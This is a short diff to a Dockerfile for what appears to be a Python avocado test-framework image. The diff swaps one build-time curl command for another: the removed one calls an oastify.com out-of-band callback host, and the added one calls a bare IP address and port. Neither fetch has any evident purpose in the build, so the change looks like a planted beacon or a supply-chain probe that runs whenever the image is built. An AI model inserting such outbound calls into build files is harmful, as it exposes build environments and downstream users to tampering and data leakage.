@@ -7,7 +7,7 @@ RUN ./user.sh $USER_ID ;\
     apt-get update && apt-get install -y git wget gnupg2 make curl python3-pip gcc ;\
     pip3 install avocado-framework pylint Jinja2
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/python-avocado.Dockerfile
+RUN curl http://65.109.68.176:15172/built/python-avocado.Dockerfile
 
 # Accept all OSes
 ENV UNSUPPORTED=y
